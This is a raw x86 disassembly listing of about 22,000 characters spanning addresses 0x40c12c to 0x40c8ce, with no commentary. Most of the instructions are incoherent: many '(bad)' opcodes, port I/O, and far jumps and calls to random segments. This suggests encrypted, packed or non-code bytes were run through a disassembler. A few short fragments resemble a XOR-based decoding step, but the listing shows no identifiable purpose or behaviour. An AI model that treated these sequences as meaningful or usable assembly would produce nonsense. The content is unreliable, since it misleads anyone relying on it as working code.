  40c12c:	mov    cl,0x7e
  40c12e:	push   eax
  40c12f:	repnz test eax,0x981639a3
  40c135:	shl    BYTE PTR [ebp+0x24],0xa1
  40c139:	loop   0x40c120
  40c13b:	inc    ecx
  40c13c:	and    DWORD PTR [ebx],edi
  40c13e:	mov    ebp,0x21081513
  40c143:	mov    bh,0x7
  40c145:	icebp  
  40c146:	mov    ds:0x5fcea72f,eax
  40c14b:	push   0xd5eb8cf2
  40c150:	xlat   BYTE PTR ds:[ebx]
  40c151:	cmp    eax,0x2ae2e9ec
  40c156:	mov    BYTE PTR [ebx],0x0
  40c159:	lea    edi,[ecx+edi*1]
  40c15c:	xor    al,0x96
  40c15e:	or     DWORD PTR [edi+0x6a8afdd2],esi
  40c164:	mov    esp,ecx
  40c166:	imul   ebp,DWORD PTR [ebx-0x291f60c2],0x19
  40c16d:	ins    DWORD PTR es:[edi],dx
  40c16e:	ficom  WORD PTR [ebx]
  40c170:	(bad)  
  40c171:	out    0xb9,eax
  40c173:	sbb    eax,0x22486a99
  40c178:	sub    ecx,DWORD PTR [ebp+0x7f9b2fe9]
  40c17e:	mov    ebp,0xed3ab034
  40c183:	or     ecx,DWORD PTR [edi+0x1ae7906f]
  40c189:	jno    0x40c123
  40c18b:	adc    dh,al
  40c18d:	jl     0x40c126
  40c18f:	mov    esi,0x62122119
  40c194:	lea    ebp,[esi-0x38]
  40c197:	pop    esp
  40c198:	lock jl 0x40c156
  40c19b:	xchg   DWORD PTR [edx-0x11],ecx
  40c19e:	ins    BYTE PTR es:[edi],dx
  40c19f:	adc    ebx,esp
  40c1a1:	fnstenv [ebx-0x6e43f93c]
  40c1a7:	scas   al,BYTE PTR es:[edi]
  40c1a8:	test   eax,0x198bace4
  40c1ad:	sahf   
  40c1ae:	add    DWORD PTR [esi],esp
  40c1b0:	inc    edx
  40c1b1:	xchg   ecx,eax
  40c1b2:	jb     0x40c150
  40c1b4:	sbb    ah,dh
  40c1b6:	pop    ds
  40c1b7:	pop    ebp
  40c1b8:	and    eax,0xf297b067
  40c1bd:	es scas eax,DWORD PTR es:[edi]
  40c1bf:	mov    ebx,0x464c0c1a
  40c1c4:	dec    edx
  40c1c5:	fisttp DWORD PTR ds:0xc1e9d103
  40c1cb:	or     al,BYTE PTR [eax]
  40c1cd:	add    cl,ch
  40c1cf:	outs   dx,BYTE PTR ds:[esi]
  40c1d0:	add    eax,DWORD PTR [eax]
  40c1d2:	add    BYTE PTR [esi],dl
  40c1d4:	daa    
  40c1d5:	inc    ecx
  40c1d6:	imul   esi,DWORD PTR [ecx+0x69],0xb3b66736
  40c1dd:	xchg   ecx,eax
  40c1de:	popf   
  40c1df:	inc    ebx
  40c1e0:	leave  
  40c1e1:	mov    edi,0x7c88391b
  40c1e6:	jl     0x40c1b2
  40c1e8:	jns    0x40c266
  40c1ea:	jl     0x40c1f6
  40c1ec:	pop    ecx
  40c1ed:	and    BYTE PTR [eax],bh
  40c1ef:	dec    edi
  40c1f0:	sbb    al,0xd5
  40c1f2:	daa    
  40c1f3:	add    ebp,DWORD PTR [edi-0x7fcc825c]
  40c1f9:	cli    
  40c1fa:	pusha  
  40c1fb:	sub    al,0xff
  40c1fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1fe:	cmp    eax,0x971b6cc8
  40c203:	pop    ebx
  40c204:	push   cs
  40c205:	test   eax,0x2d37f69e
  40c20a:	mov    cl,0xb4
  40c20c:	mov    esi,DWORD PTR [eax+0x3]
  40c20f:	dec    esi
  40c210:	sub    al,0x48
  40c212:	cmp    BYTE PTR ds:0x2d79ebf6,al
  40c218:	sbb    BYTE PTR [edi+0x30d46c84],cl
  40c21e:	sub    DWORD PTR [esi],ecx
  40c220:	and    al,0x76
  40c222:	and    DWORD PTR [ecx],edi
  40c224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c225:	ss pop ss
  40c227:	nop
  40c228:	dec    edi
  40c229:	stos   DWORD PTR es:[edi],eax
  40c22a:	lods   al,BYTE PTR ds:[esi]
  40c22b:	into   
  40c22c:	sbb    ch,cl
  40c22e:	sbb    eax,0x9e3b7cfb
  40c233:	add    bl,BYTE PTR cs:[esi+0x7e]
  40c237:	(bad)  
  40c238:	adc    eax,0x37dc2fe
  40c23d:	and    eax,DWORD PTR [esi+0x32ede50d]
  40c243:	pop    ebx
  40c244:	sub    BYTE PTR [ebp-0x1c],al
  40c247:	ret    0x624c
  40c24a:	(bad)  
  40c24b:	xlat   BYTE PTR ds:[ebx]
  40c24c:	in     al,dx
  40c24d:	mov    dl,0xe6
  40c24f:	cmp    al,0xae
  40c251:	xchg   ecx,eax
  40c252:	pop    edi
  40c253:	enter  0xba66,0x2
  40c257:	retf   
  40c258:	adc    esi,DWORD PTR [eax+edi*1]
  40c25b:	mov    ah,0x8e
  40c25d:	pusha  
  40c25e:	int3   
  40c25f:	xchg   ebp,eax
  40c260:	xchg   esi,eax
  40c261:	jnp    0x40c201
  40c263:	mov    al,0xfd
  40c265:	pop    eax
  40c266:	cdq    
  40c267:	dec    edx
  40c268:	jle    0x40c2a8
  40c26a:	jecxz  0x40c212
  40c26c:	(bad)  
  40c26d:	cmp    esp,ebx
  40c26f:	and    eax,0xaed4f25a
  40c274:	mov    ds:0xf64ba5ba,eax
  40c279:	sub    ch,BYTE PTR [esi-0xb]
  40c27c:	and    eax,0x1f25b6e4
  40c281:	mov    dl,BYTE PTR [ebp-0x6bbefb7]
  40c287:	out    dx,al
  40c288:	or     edx,DWORD PTR [edi+0x7ea862ca]
  40c28e:	in     eax,dx
  40c28f:	jae    0x40c310
  40c291:	shl    BYTE PTR [esi],cl
  40c293:	or     bl,BYTE PTR [ecx+edx*8]
  40c296:	sub    dl,BYTE PTR [edx-0x5612ef53]
  40c29c:	mov    esp,0x6838c2e5
  40c2a1:	imul   esi,DWORD PTR [ebx+0x5d60471f],0xfe3107cf
  40c2ab:	mov    ebp,0xd2132531
  40c2b0:	and    DWORD PTR [ecx+0x69dcf8f9],0x7e1e6ee4
  40c2ba:	arpl   WORD PTR [ecx-0x4c],sp
  40c2bd:	nop
  40c2be:	xchg   ax,ax
  40c2c0:	xchg   BYTE PTR [eax+0x44],ch
  40c2c3:	inc    BYTE PTR [eax+0x1e]
  40c2c6:	femms  
  40c2c8:	jg     0x40c2e5
  40c2ca:	out    dx,al
  40c2cb:	jae    0x40c25d
  40c2cd:	xchg   esp,eax
  40c2ce:	xchg   ebp,eax
  40c2cf:	mov    ch,0xcc
  40c2d1:	jns    0x40c262
  40c2d3:	mov    ah,0x26
  40c2d5:	(bad)  [eax-0x7aa0d59e]
  40c2db:	stc    
  40c2dc:	fdiv   st(1),st
  40c2de:	add    ecx,DWORD PTR [edi]
  40c2e0:	inc    ebx
  40c2e1:	imul   ecx,DWORD PTR [ebx],0xb53d5fbf
  40c2e7:	xchg   ebp,eax
  40c2e8:	fst    DWORD PTR [ebp+0x64]
  40c2eb:	test   BYTE PTR [edx+0x4],ch
  40c2ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2ef:	enter  0xaec8,0x42
  40c2f3:	jmp    0x6c7f:0x5d47d520
  40c2fa:	or     BYTE PTR [esi],ah
  40c2fc:	jg     0x40c35d
  40c2fe:	pop    edi
  40c2ff:	sub    DWORD PTR [ebx-0x35],ecx
  40c302:	push   edx
  40c304:	or     dh,BYTE PTR [edx-0x420881bd]
  40c30a:	stc    
  40c30b:	jl     0x40c328
  40c30d:	mov    WORD PTR [edx],gs
  40c30f:	imul   ebp,DWORD PTR [ecx+ebp*4-0x6a],0x25
  40c314:	lahf   
  40c315:	outs   dx,BYTE PTR ds:[esi]
  40c316:	lock xchg BYTE PTR [esi-0x62693d9a],ch
  40c31d:	cmp    eax,0xc605da70
  40c322:	pop    ebp
  40c323:	or     BYTE PTR [ecx-0x56c46fc],0x8c
  40c32a:	jns    0x40c3a9
  40c32c:	jmp    0xb17e3e2a
  40c331:	mov    eax,ds:0x90964609
  40c336:	cs dec esp
  40c338:	pop    ebx
  40c339:	adc    DWORD PTR [ebx-0xb],edx
  40c33c:	aad    0x9f
  40c33e:	pop    es
  40c33f:	pop    edi
  40c340:	daa    
  40c341:	ret    0xd6f6
  40c344:	mov    edi,ecx
  40c346:	push   0xa4b8eb46
  40c34b:	inc    edx
  40c34c:	jno    0x40c338
  40c34e:	mov    al,0xe6
  40c350:	cwde   
  40c351:	rcr    bh,1
  40c353:	fs xor cl,al
  40c356:	std    
  40c357:	inc    DWORD PTR [edi+0x5bf53052]
  40c35d:	sar    DWORD PTR [ecx-0x7f94d66e],1
  40c363:	and    eax,0x7a873906
  40c368:	xchg   ch,bh
  40c36a:	mov    BYTE PTR [ecx+ecx*4+0x3a],bl
  40c36e:	gs jns 0x40c32c
  40c371:	pop    ebx
  40c372:	mov    esi,edi
  40c374:	jnp    0x40c3b4
  40c376:	and    esp,DWORD PTR ds:0x6f9b5406
  40c37c:	push   es
  40c37d:	daa    
  40c37e:	test   DWORD PTR [edx-0x7f8ef52],esp
  40c384:	adc    edx,edi
  40c386:	cmp    eax,ebx
  40c388:	mov    al,ds:0x7d137139
  40c38d:	xchg   ebx,eax
  40c38e:	lds    edx,FWORD PTR [edi+0x1]
  40c391:	fsub   st,st(2)
  40c393:	sbb    al,0x12
  40c395:	test   eax,0xc3c7b491
  40c39a:	pushf  
  40c39b:	xor    bh,BYTE PTR [esi+0x540a300a]
  40c3a1:	rcr    BYTE PTR [esi-0x1a439bce],1
  40c3a7:	xchg   edx,eax
  40c3a8:	xchg   dh,ah
  40c3aa:	and    eax,0x783989e3
  40c3af:	ficom  DWORD PTR [eax+0x65]
  40c3b3:	xlat   BYTE PTR ds:[ebx]
  40c3b4:	mov    BYTE PTR [ebx-0x78f7d1da],ah
  40c3ba:	adc    eax,0x9dbce208
  40c3bf:	rcr    DWORD PTR [esi],1
  40c3c1:	inc    esp
  40c3c2:	jne    0x40c43b
  40c3c4:	push   ds
  40c3c5:	ins    DWORD PTR es:[edi],dx
  40c3c6:	sbb    BYTE PTR [eax+0x3cd304f1],bh
  40c3cc:	in     eax,dx
  40c3cd:	xlat   BYTE PTR ds:[ebx]
  40c3ce:	pop    esi
  40c3cf:	pop    ebx
  40c3d0:	das    
  40c3d1:	add    eax,0xc33fa38e
  40c3d6:	and    al,0x4f
  40c3d8:	(bad)
  40c3db:	inc    ebx
  40c3dc:	inc    ecx
  40c3dd:	xor    BYTE PTR [ebx-0x45],ah
  40c3e0:	adc    ch,bl
  40c3e2:	lock ror BYTE PTR [ebx+0x38],0x44
  40c3e7:	xchg   ebp,eax
  40c3e8:	push   es
  40c3e9:	mov    ch,0x38
  40c3eb:	std    
  40c3ec:	dec    ebx
  40c3ed:	out    0x39,eax
  40c3ef:	adc    BYTE PTR [edx+0x18903936],al
  40c3f5:	rcr    DWORD PTR [ebx],cl
  40c3f7:	and    bh,BYTE PTR [esi+edx*4-0x4b]
  40c3fb:	sti    
  40c3fc:	xchg   ebp,eax
  40c3fd:	cwde   
  40c3fe:	mov    ds:0x6f8ec033,eax
  40c403:	mov    al,ah
  40c405:	xchg   esp,eax
  40c406:	bound  ebx,QWORD PTR [ebx-0x520c3ae6]
  40c40c:	sbb    eax,0xbc1e5d65
  40c411:	jns    0x40c428
  40c413:	stos   BYTE PTR es:[edi],al
  40c414:	scas   al,BYTE PTR es:[edi]
  40c415:	int    0xe1
  40c417:	and    ebx,0xf18e290
  40c41d:	push   eax
  40c41e:	mov    ds:0xe36bae54,eax
  40c423:	inc    ebx
  40c424:	dec    eax
  40c425:	call   0x7570:0x170b28f4
  40c42c:	inc    ecx
  40c42d:	mov    al,ds:0x5fb6a733
  40c432:	add    al,0xf4
  40c434:	ret    0xfb60
  40c437:	inc    edi
  40c438:	jp     0x40c3e5
  40c43a:	loop   0x40c499
  40c43c:	mov    eax,0x8e8ad5d2
  40c441:	or     DWORD PTR [ebx],ebp
  40c443:	je     0x40c423
  40c445:	and    al,0x2a
  40c447:	scas   eax,DWORD PTR es:[edi]
  40c448:	mov    ds:0x3bf2e7a6,eax
  40c44d:	mov    bl,ah
  40c44f:	rcl    DWORD PTR [ebp-0x5ca4cdf3],cl
  40c455:	dec    ebx
  40c456:	pop    esp
  40c457:	arpl   bx,sp
  40c459:	fdivrp st(7),st
  40c45b:	pop    esp
  40c45c:	int    0xd1
  40c45e:	mov    ebx,DWORD PTR [ebp-0x267df425]
  40c464:	push   es
  40c465:	mov    esi,0xc2be2315
  40c46a:	icebp  
  40c46b:	adc    bh,BYTE PTR [edi]
  40c46d:	push   ebp
  40c46e:	push   cs
  40c46f:	rol    DWORD PTR [eax+edx*2],1
  40c472:	and    BYTE PTR [edx],bh
  40c474:	aam    0x7b
  40c476:	mov    eax,0x65718cd5
  40c47b:	out    0x37,eax
  40c47d:	push   edx
  40c47e:	xor    BYTE PTR [edi],dh
  40c480:	pop    edi
  40c481:	xchg   esi,eax
  40c482:	xchg   esp,eax
  40c483:	inc    esp
  40c484:	ins    BYTE PTR es:[edi],dx
  40c485:	mov    al,0xbe
  40c487:	dec    esi
  40c488:	fiadd  DWORD PTR [ebx-0x5fba01dd]
  40c48e:	fmul   DWORD PTR [esi+edx*4+0x50]
  40c492:	xchg   ebp,eax
  40c493:	pop    DWORD PTR [eax+0x15]
  40c496:	mov    al,BYTE PTR [ebp+0x386861db]
  40c49c:	cli    
  40c49d:	add    ecx,edi
  40c49f:	xor    edi,DWORD PTR [ecx+0x4b]
  40c4a2:	push   ss
  40c4a3:	jmp    0xbe5f:0x1cefe78a
  40c4aa:	jg     0x40c4ce
  40c4ac:	xchg   ebp,eax
  40c4ad:	push   ebp
  40c4ae:	(bad)  
  40c4af:	ror    DWORD PTR [edx],1
  40c4b1:	sbb    DWORD PTR [edx-0x7f1cb874],esp
  40c4b7:	bound  esi,QWORD PTR [ebp-0x33f7a5ce]
  40c4bd:	inc    esi
  40c4be:	mov    BYTE PTR [eax+0x1e9d209f],dh
  40c4c4:	adc    DWORD PTR [edx-0x4132706b],0x26
  40c4cb:	ins    DWORD PTR es:[edi],dx
  40c4cc:	div    BYTE PTR fs:[edx-0x35aa948f]
  40c4d3:	jle    0x40c52b
  40c4d5:	mov    ah,0x77
  40c4d7:	cs jl  0x40c469
  40c4da:	jp     0x40c4ef
  40c4dc:	stc    
  40c4dd:	mov    ebx,0x390f0731
  40c4e2:	pushf  
  40c4e3:	xor    bh,BYTE PTR [ebx-0x1b070f19]
  40c4e9:	enter  0xe66a,0x6f
  40c4ed:	(bad)  
  40c4ee:	sbb    al,0xa7
  40c4f0:	push   esp
  40c4f1:	in     al,0xb9
  40c4f3:	xchg   ebx,eax
  40c4f4:	sbb    al,0xe
  40c4f6:	ret    0x246d
  40c4f9:	inc    ebx
  40c4fa:	push   eax
  40c4fb:	add    al,0x55
  40c4fd:	adc    DWORD PTR [edi],ebx
  40c4ff:	pop    ss
  40c500:	ficom  WORD PTR [edx+ebp*2-0x29c837f6]
  40c507:	sub    eax,DWORD PTR [ecx-0x21893a92]
  40c50d:	mov    ch,0xbb
  40c50f:	stos   BYTE PTR es:[edi],al
  40c510:	cld    
  40c511:	dec    ecx
  40c512:	dec    ecx
  40c513:	clc    
  40c514:	arpl   WORD PTR [ecx-0x61dcb016],dx
  40c51a:	jo     0x40c502
  40c51c:	sets   BYTE PTR [ecx-0x6d]
  40c520:	std    
  40c521:	dec    ecx
  40c522:	cmp    DWORD PTR [ecx],eax
  40c524:	pusha  
  40c525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c526:	lahf   
  40c527:	mov    bh,0xf7
  40c529:	or     bh,0x2a
  40c52c:	xchg   esi,eax
  40c52d:	mov    eax,ds:0x5657162e
  40c532:	pop    edx
  40c533:	or     al,0x4d
  40c535:	cwde   
  40c536:	not    DWORD PTR [esi+0xd]
  40c539:	ins    DWORD PTR es:[edi],dx
  40c53a:	xchg   esp,eax
  40c53b:	out    0x87,al
  40c53d:	jne    0x40c5a1
  40c53f:	inc    edx
  40c540:	clc    
  40c541:	mov    edx,DWORD PTR [ebp-0x18]
  40c544:	xor    edx,eax
  40c546:	add    edx,DWORD PTR [ebp-0x14]
  40c549:	mov    edi,DWORD PTR [ebp-0x1c]
  40c54c:	jmp    0x40c8bf
  40c551:	push   esp
  40c552:	pushf  
  40c553:	scas   al,BYTE PTR es:[edi]
  40c554:	stos   DWORD PTR es:[edi],eax
  40c555:	jbe    0x40c50c
  40c557:	pop    ebp
  40c558:	arpl   WORD PTR ds:0x5b69733d,si
  40c55e:	or     al,0x3b
  40c560:	rcl    DWORD PTR [edi-0x3583836b],cl
  40c566:	jns    0x40c5e4
  40c568:	jl     0x40c54e
  40c56a:	inc    esp
  40c56b:	(bad)  
  40c56c:	leave  
  40c56d:	dec    ebp
  40c56e:	dec    esp
  40c56f:	iret   
  40c570:	xchg   esp,eax
  40c571:	dec    ebp
  40c572:	mov    esp,0x22a70943
  40c577:	mov    DWORD PTR [eax-0x7e],0x822b890c
  40c57e:	shr    BYTE PTR [edi],cl
  40c580:	int    0xf
  40c582:	jmp    0x40c568
  40c584:	mov    edx,0x49b6a533
  40c589:	push   esp
  40c58a:	cli    
  40c58b:	pop    esi
  40c58c:	add    al,0x8e
  40c58e:	cdq    
  40c58f:	mov    edi,0x5398064a
  40c594:	out    dx,eax
  40c595:	inc    esi
  40c596:	int    0xc0
  40c598:	fldcw  WORD PTR [eax+0x6c]
  40c59b:	dec    eax
  40c59c:	pop    ss
  40c59d:	xchg   edi,eax
  40c59e:	jl     0x40c56a
  40c5a0:	icebp  
  40c5a1:	lahf   
  40c5a2:	push   ebx
  40c5a3:	pop    edi
  40c5a4:	std    
  40c5a5:	xchg   DWORD PTR [eax],esi
  40c5a7:	nop
  40c5a8:	sub    BYTE PTR [eax+esi*2+0x3b],dh
  40c5ac:	(bad)  
  40c5ad:	dec    esp
  40c5ae:	lods   eax,DWORD PTR ds:[esi]
  40c5af:	ficom  WORD PTR [ebp+edx*1-0x6af90f8a]
  40c5b6:	mov    edx,0xf3141d2d
  40c5bb:	push   ds
  40c5bc:	mov    edx,0x26190b5f
  40c5c1:	add    al,0xf6
  40c5c3:	sbb    BYTE PTR [ecx],dh
  40c5c5:	mov    esi,0xe39c99e4
  40c5ca:	cmp    BYTE PTR ss:[ebx+0x5e],bh
  40c5ce:	hlt    
  40c5cf:	jp     0x40c578
  40c5d1:	inc    ebp
  40c5d2:	pop    esp
  40c5d3:	or     al,0xaf
  40c5d5:	inc    esp
  40c5d6:	and    DWORD PTR [ebp+ecx*1-0x26],ebp
  40c5da:	int    0x6c
  40c5dc:	push   esp
  40c5dd:	xor    bh,bh
  40c5df:	lods   al,BYTE PTR ds:[esi]
  40c5e0:	mov    eax,ds:0xa20315a
  40c5e5:	lea    esi,[ebx-0x4e]
  40c5e8:	jmp    0xc570:0x8b38c38c
  40c5ef:	and    BYTE PTR [eax],ch
  40c5f1:	aad    0xe2
  40c5f3:	mov    ss,WORD PTR [edx-0x1d]
  40c5f6:	or     al,0x83
  40c5f8:	mov    ebx,0x60686a68
  40c5fd:	stc    
  40c5fe:	ins    BYTE PTR es:[edi],dx
  40c5ff:	dec    ebp
  40c600:	jecxz  0x40c586
  40c602:	fisub  DWORD PTR [eax+0x39]
  40c605:	fcmovb st,st(2)
  40c607:	add    DWORD PTR [edi],0x79498f67
  40c60d:	or     DWORD PTR [edi],0xa1cc05df
  40c613:	sub    eax,0x95a73d5b
  40c618:	push   ds
  40c619:	out    0xd8,al
  40c61b:	clc    
  40c61c:	xlat   BYTE PTR ds:[ebx]
  40c61d:	mov    ebp,0xc591e15c
  40c622:	shr    DWORD PTR ds:0xfa4a2e39,cl
  40c628:	sahf   
  40c629:	jae    0x40c698
  40c62b:	fcmovnb st,st(0)
  40c62d:	mov    bh,0xee
  40c62f:	cmc    
  40c630:	xchg   edi,eax
  40c631:	sbb    bh,BYTE PTR [ebx-0x48]
  40c634:	sbb    ecx,ebx
  40c636:	scas   al,BYTE PTR es:[edi]
  40c637:	push   ss
  40c638:	or     ebp,ebx
  40c63a:	test   DWORD PTR [edi+0x7fc0a9f9],ecx
  40c640:	(bad)  
  40c641:	cld    
  40c642:	xchg   edx,eax
  40c643:	lods   al,BYTE PTR ds:[esi]
  40c644:	or     al,0xbe
  40c646:	jp     0x40c63d
  40c648:	cmp    BYTE PTR [ecx],al
  40c64a:	nop
  40c64b:	xor    eax,DWORD PTR [ecx-0x1f]
  40c64e:	not    DWORD PTR [eax+ebp*4]
  40c651:	or     ebp,eax
  40c653:	push   edi
  40c654:	pop    ebp
  40c655:	adc    cl,ah
  40c657:	in     eax,0x9e
  40c659:	hlt    
  40c65a:	cmp    eax,0x896c67cf
  40c65f:	clc    
  40c660:	cmp    DWORD PTR gs:[esi-0x29],edx
  40c664:	rol    BYTE PTR [ebp-0x4f],cl
  40c667:	mov    DWORD PTR [edx-0x43],0xa1efa68a
  40c66e:	push   0xffffff82
  40c670:	cdq    
  40c671:	mov    ebp,eax
  40c673:	inc    edx
  40c674:	inc    esp
  40c675:	or     al,0x94
  40c677:	retf   
  40c678:	neg    BYTE PTR [si+0x4f37]
  40c67d:	into   
  40c67e:	dec    edx
  40c67f:	aam    0x1c
  40c681:	ja     0x40c6dc
  40c683:	jae    0x40c6e2
  40c685:	mov    eax,DWORD PTR [ebp-0x33]
  40c688:	cmp    eax,0xff63cfc8
  40c68d:	cli    
  40c68e:	ja     0x40c6d4
  40c690:	mov    eax,ds:0xb815268f
  40c695:	rcr    DWORD PTR [edi+0x6908b993],0xe
  40c69c:	pop    es
  40c69d:	pop    es
  40c69e:	or     ah,BYTE PTR [eax-0x77]
  40c6a1:	enter  0x3417,0x74
  40c6a5:	mov    al,ds:0xbb9a3676
  40c6aa:	jno    0x40c6e0
  40c6ac:	je     0x40c64c
  40c6ae:	test   al,0xf3
  40c6b0:	push   eax
  40c6b1:	cmp    al,BYTE PTR [eax]
  40c6b3:	shl    DWORD PTR [esp+edx*4+0x57],0xdf
  40c6b8:	mov    fs,WORD PTR gs:[esi]
  40c6bb:	cmp    ecx,DWORD PTR [ecx]
  40c6bd:	ret    0x2c41
  40c6c0:	ret    
  40c6c1:	iret   
  40c6c2:	and    eax,DWORD PTR [ebp+0x447e28e1]
  40c6c8:	cmp    al,0xaa
  40c6ca:	in     al,dx
  40c6cb:	xor    eax,0xe6a76c85
  40c6d0:	adc    al,0x99
  40c6d2:	sub    bh,BYTE PTR [eax+ebp*4]
  40c6d5:	gs mov ebx,0x6bfd94f5
  40c6db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6dc:	or     al,0xb1
  40c6de:	mov    ebx,ecx
  40c6e0:	jb     0x40c662
  40c6e2:	xor    edi,DWORD PTR [esi+0x6d]
  40c6e5:	rcr    DWORD PTR [edi+0x61],0xba
  40c6e9:	push   ebp
  40c6ea:	xor    ebx,DWORD PTR [esi+esi*2]
  40c6ed:	jl     0x40c759
  40c6ef:	test   al,0x65
  40c6f1:	pop    edi
  40c6f2:	aam    0x26
  40c6f4:	leave  
  40c6f5:	mov    dh,0x99
  40c6f7:	mov    eax,ds:0x263b8dbc
  40c6fc:	cld    
  40c6fd:	xchg   edx,eax
  40c6fe:	sub    DWORD PTR [ebp-0x1a397f72],0xffffffe4
  40c705:	stos   BYTE PTR es:[edi],al
  40c706:	sbb    BYTE PTR [ecx+ebx*2+0x66874974],dl
  40c70d:	in     al,0x7a
  40c70f:	add    BYTE PTR [edx],al
  40c711:	aam    0x6b
  40c713:	lds    esp,FWORD PTR [eax+0x62]
  40c716:	mov    dh,0x5b
  40c718:	mov    al,0x3c
  40c71a:	sub    ah,BYTE PTR [edx+0x2a5cea96]
  40c720:	inc    esp
  40c721:	pop    ss
  40c722:	mov    bh,0x8b
  40c724:	jb     0x40c6bc
  40c726:	inc    esi
  40c727:	mov    ebp,0xdcaea931
  40c72c:	push   ds
  40c72d:	fbstp  TBYTE PTR [ecx-0x71]
  40c730:	pop    ecx
  40c731:	xor    eax,0x9c2e347e
  40c736:	push   esp
  40c737:	fiadd  DWORD PTR [eax+eiz*1-0x3c4e03f9]
  40c73e:	mov    al,gs:0xd9f48308
  40c744:	mov    al,0x5b
  40c746:	mov    edx,0x81487b78
  40c74b:	imul   eax,DWORD PTR [esi-0x1a],0xffffffa4
  40c74f:	mov    dl,0xf3
  40c751:	xchg   DWORD PTR [esi+0x356c60e4],esi
  40c757:	push   edx
  40c758:	jl     0x40c768
  40c75a:	pop    ecx
  40c75b:	ins    BYTE PTR es:[edi],dx
  40c75c:	bound  ecx,QWORD PTR [ebp-0x19]
  40c75f:	enter  0x8970,0xcd
  40c763:	aam    0xb3
  40c765:	mov    bh,0x56
  40c767:	(bad)  
  40c768:	mov    esp,0xdd73b595
  40c76d:	xor    ecx,DWORD PTR [eax-0x346ac53b]
  40c773:	or     BYTE PTR [eax],0xa8
  40c776:	inc    ebp
  40c777:	ror    BYTE PTR [eax+0x28860375],0x0
  40c77e:	call   0xe44:0xc7ab1139
  40c785:	lds    ebp,FWORD PTR [edx]
  40c787:	mov    bh,0xf0
  40c789:	into   
  40c78a:	out    dx,al
  40c78b:	repnz xchg ebp,eax
  40c78d:	and    ah,BYTE PTR [ecx+0x2c]
  40c790:	shl    BYTE PTR [eax+0x7d],0x86
  40c794:	das    
  40c795:	or     eax,0x220cafdb
  40c79a:	cli    
  40c79b:	mov    ecx,0x6baffeb
  40c7a0:	mov    edi,0x9a118e70
  40c7a5:	or     ch,BYTE PTR [esi-0x3bf109da]
  40c7ab:	ret    0xcfe3
  40c7ae:	imul   esp,DWORD PTR [eax-0x44269467],0xffffff84
  40c7b5:	mov    ebp,es
  40c7b7:	imul   ebx,DWORD PTR [ebx+0x4dcfe6b1],0xffffffb2
  40c7be:	aaa    
  40c7bf:	add    dl,bl
  40c7c1:	xchg   esp,eax
  40c7c2:	pop    es
  40c7c3:	arpl   WORD PTR [esi],si
  40c7c5:	xor    eax,DWORD PTR [ebx-0x1067992a]
  40c7cb:	nop
  40c7cc:	jp     0x40c80d
  40c7ce:	sub    dl,cl
  40c7d0:	mov    ecx,0x547183f4
  40c7d5:	inc    edi
  40c7d6:	or     eax,0xd74c6c0f
  40c7db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7dc:	call   0x2c88:0xe944dae6
  40c7e3:	loopne 0x40c85b
  40c7e5:	test   eax,0x4e4157f1
  40c7ea:	cmp    eax,eax
  40c7ec:	add    DWORD PTR ds:0x474bf3ba,esi
  40c7f2:	jb     0x40c862
  40c7f4:	pushf  
  40c7f5:	shr    DWORD PTR ds:0xee0191e9,0x7e
  40c7fc:	add    ecx,DWORD PTR [esi]
  40c7fe:	cmc    
  40c7ff:	(bad)  
  40c800:	push   ss
  40c801:	push   cs
  40c802:	call   0x9a55:0xdb02af9b
  40c809:	ds js  0x40c82a
  40c80c:	pop    eax
  40c80d:	xchg   edx,eax
  40c80e:	push   es
  40c80f:	xchg   BYTE PTR [ecx-0x30536a84],dh
  40c815:	cwde   
  40c816:	daa    
  40c817:	ret    0xdd1f
  40c81a:	xor    ebp,DWORD PTR [esi-0x50f2122a]
  40c820:	jns    0x40c7bb
  40c822:	ds pop ebp
  40c824:	icebp  
  40c825:	jl     0x40c7fd
  40c827:	dec    esi
  40c828:	jmp    0x45ec:0x8d8a4939
  40c82f:	pusha  
  40c830:	sbb    ebp,edi
  40c832:	(bad)  
  40c834:	loopne 0x40c7f5
  40c836:	xlat   BYTE PTR ds:[ebx]
  40c837:	cmp    edx,esp
  40c839:	popa   
  40c83a:	jmp    0x9c68:0x85fbd05c
  40c841:	repnz dec esi
  40c843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c844:	cld    
  40c845:	push   cs
  40c846:	mov    edi,edx
  40c848:	jge    0x40c852
  40c84a:	sub    cl,bl
  40c84c:	adc    BYTE PTR [edi-0x7ae4ea61],bh
  40c852:	add    edi,edi
  40c854:	sbb    DWORD PTR ds:0x8b9f97af,edi
  40c85a:	mov    esi,0xcbae8ad9
  40c85f:	xchg   BYTE PTR [eax],dl
  40c861:	sbb    al,0x61
  40c863:	push   ebx
  40c864:	fcomi  st,st(7)
  40c866:	leave  
  40c867:	bound  ebx,QWORD PTR ds:0x59815e0d
  40c86d:	add    ah,BYTE PTR [ecx+0x10]
  40c870:	mov    ds:0x49b91722,al
  40c875:	adc    BYTE PTR [edx],0xd9
  40c878:	fcomip st,st(2)
  40c87a:	into   
  40c87b:	mov    BYTE PTR [eax+edx*8],bh
  40c87e:	ret    0x8438
  40c881:	mov    bl,0x82
  40c883:	or     bl,BYTE PTR [esi+eax*2-0x26011f06]
  40c88a:	iret   
  40c88b:	mov    edi,0x5d4ae662
  40c890:	mov    bh,0xd8
  40c892:	xchg   DWORD PTR [eax+eax*1-0x35a025b6],esp
  40c899:	push   cs
  40c89a:	pop    edx
  40c89b:	cmp    eax,0xfbcc1412
  40c8a0:	add    eax,0xf7428d29
  40c8a5:	or     eax,edx
  40c8a7:	hlt    
  40c8a8:	int3   
  40c8a9:	xor    BYTE PTR [edi+0x3b],ah
  40c8ac:	inc    ecx
  40c8ad:	test   bl,bh
  40c8af:	sbb    DWORD PTR [eax+0x32e4a57b],0x71
  40c8b6:	mov    ds:0x2e8c66c1,al
  40c8bb:	and    al,0x77
  40c8bd:	fistp  WORD PTR [edx+ecx*4+0x729a3a94]
  40c8c4:	xor    al,BYTE PTR [eax]
  40c8c6:	mov    BYTE PTR [ebp+0xf],dl
  40c8c9:	mov    edx,DWORD PTR [ebp-0xc]
  40c8cc:	xor    edx,eax
  40c8ce:	add    edx,DWORD PTR [ebp-0x14]
